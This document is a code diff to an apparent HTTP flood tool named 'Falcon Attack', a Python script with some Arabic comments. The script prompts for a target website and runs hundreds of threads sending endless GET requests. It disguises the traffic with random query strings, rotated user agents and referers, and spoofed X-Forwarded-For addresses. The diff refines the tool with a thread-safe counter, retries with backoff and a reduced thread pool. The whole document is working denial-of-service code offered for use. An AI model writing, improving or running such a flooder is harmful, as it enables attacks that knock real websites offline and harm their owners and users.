@@ -2,14 +2,16 @@ import urllib.request
 import concurrent.futures
 import random
 import re
-import sys,os
+import sys, os
 from colorama import Fore
 import threading
 import string
 from halo import Halo
+import time
 from logo import logo
 from ipFake import random_ipFake
 from userAgent import uagent
+
 # -------------------------
 global params
 url = ''
@@ -19,16 +21,17 @@ headers_referers = []
 request_counter = 0
 flag = 0
 safe = 0
-__version__ = '8.7'
+__version__ = '8.0'
 __author__ = "Al-Mohammady Team."
 __method__ = 'HTTP'
 
-
-
+# قفل لتأمين العداد في البرمجة متعددة الخيوط
+counter_lock = threading.Lock()
 
 def inc_counter():
     global request_counter
-    request_counter += 1
+    with counter_lock:
+        request_counter += 1
 
 def set_flag(val):
     global flag
@@ -38,78 +41,78 @@ def set_safe():
     global safe
     safe = 1
 
-#Read data from file
-
- #generates a user agent array
-
-#def useragent_list():
-#    global headers_useragents
-#    headers_useragents = read_file('user_agent.txt')
-#    return headers_useragents
-
-
- #generates a referer array
+# generates a referer array with caching
 def referer_list():
     global headers_referers
-    with open('Tools/referers.txt', 'r') as file:
-        data = file.readlines()
-        headers_referers = random.sample([item.strip() for item in data], 2)
+    if not headers_referers:  # تحميل فقط إذا كانت القائمة فارغة
+        with open('Tools/referers.txt', 'r') as file:
+            headers_referers = [line.strip() for line in file]
+    return random.sample(headers_referers, 2)
 
-    return headers_referers
-
- #builds random ASCII string
+# builds random ASCII string
 def buildblock(size):
     return ''.join(random.choice(string.ascii_uppercase) for _ in range(size))
 
+# Spinner to indicate the method
 def usage():
     spinner = Halo()
     spinner.succeed(f'Method : {__method__}.')
     spinner.stop()
     print('-'*40)
 
- #http request
+# http request with retry and backoff
 def httpcall(url):
+    retries = 3
+    for i in range(retries):
+        code = 0
+        try:
+            if url.count("?") > 0:
+                param_joiner = "&"
+            else:
+                param_joiner = "?"
+            payload = buildblock(random.randint(0, 10)) + '=' + buildblock(random.randint(0,10))
+            request_url = url + param_joiner + payload
+            headers = {
+                'User-Agent': random.choice(uagent),
+                'Cache-Control': 'no-cache',
+                'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                'Referer': random.choice(referer_list()) + buildblock(random.randint(0, 10)),
+                'Keep-Alive': str(random.randint(120, 130)),
+                'Connection': 'keep-alive',
+                'Host': host,
+                'X-Forwarded-For': random_ipFake()
+            }
 
-    code = 0
-    if url.count("?") > 0:
-        param_joiner = "&"
-    else:
-        param_joiner = "?"
-    payload = buildblock(random.randint(50,90)) + '=' + buildblock(random.randint(50,90))
-    request_url = url + param_joiner + payload
-    headers = {
-        'User-Agent': random.choice(uagent),
-        'Cache-Control': 'no-cache',
-        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-        'Referer': random.choice(referer_list()) + buildblock(random.randint(100,500)),
-        'Keep-Alive': str(random.randint(120, 130)),
-        'Connection': 'keep-alive',
-        'Host': host,
-        'X-Forwarded-For': random_ipFake()
-    }
+            urllib.request.urlopen(urllib.request.Request(request_url, headers=headers))
+            inc_counter()
+            time.sleep(random.uniform(0.01, 0.05))  # تأخير عشوائي بين الطلبات
+            break  # إذا نجح الطلب، الخروج من حلقة المحاولات
 
-    try:
-        urllib.request.urlopen(urllib.request.Request(request_url, headers=headers))
-    except urllib.error.HTTPError as e:
-        set_flag(1)
-        print(f"{Fore.RED}[ 500 ] {Fore.MAGENTA} Response Code !")
-        code = 500
-    except urllib.error.URLError as e:
-        sys.exit()
-    else:
-        inc_counter()
+        except urllib.error.HTTPError as e:
+            if i < retries - 1:
+                time.sleep(2 ** i)  # زيادة زمن الانتظار تدريجياً
+            else:
+                set_flag(1)
+                print(f"{Fore.RED}[ {e.code} ] {Fore.MAGENTA} HTTP Error!")
+                code = 500
+
+        except urllib.error.URLError as e:
+            if i < retries - 1:
+                time.sleep(2 ** i)
+            else:
+                sys.exit()
 
     return code
 
- #http caller function
+# http caller function
 def http_caller(url):
-    while True:
+    while flag < 2:
         code = httpcall(url)
         if code == 500 and safe == 1:
             pass
 
- #monitors http threads and counts requests
+# monitors http threads and counts requests with delay
 def monitor_thread():
     sent = 0
     previous = request_counter
@@ -118,24 +121,23 @@ def monitor_thread():
             sent += 1
             print(f"{Fore.YELLOW}[ {sent} ] {Fore.GREEN}Request Sent! Payload Size : {Fore.YELLOW}{request_counter}.")
             previous = request_counter
+        time.sleep(0.5)  # تأخير بسيط بين التحديثات
+
     if flag == 2:
         print(f"\n{Fore.RED}-- Falcon Attack Finish --{Fore.RESET}")
 
- #execute
+# execute
 if __name__ == "__main__":
     os.system('clear')
-    #print(random_ipFake())
     logo()
-    #print(random.choice(uagent))
     usage()
-    #print(random.choice(uagent))
 
     url = input(f"{Fore.YELLOW}[ ? ]{Fore.GREEN} Website Target  : ")
 
     if url.count("/") == 2:
         url = url + "/"
 
-    m = re.search('(https?\://)?([^/]*)/?.*', url)
+    m = re.search('(https?://)?([^/]*)/?.*', url)
     host = m.group(2)
 
     safe_option = input(f"{Fore.YELLOW}[ ? ] {Fore.GREEN}Mode < safe > (yes / no) : ").lower()
@@ -143,15 +145,10 @@ if __name__ == "__main__":
         set_safe()
 
     # Using ThreadPoolExecutor to run multiple threads concurrently
-
-
-    with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
-        # Submitting HTTP call tasks to the executor
-
-        future_to_url = {executor.submit(http_caller, url): url for _ in range(1000)}
+    with concurrent.futures.ThreadPoolExecutor(max_workers=500) as executor:  # استخدام عدد معقول من الخيوط
+        future_to_url = {executor.submit(http_caller, url): url for _ in range(500)}
 
         # Starting the monitor thread
-
         t = threading.Thread(target=monitor_thread)
         t.start()
 
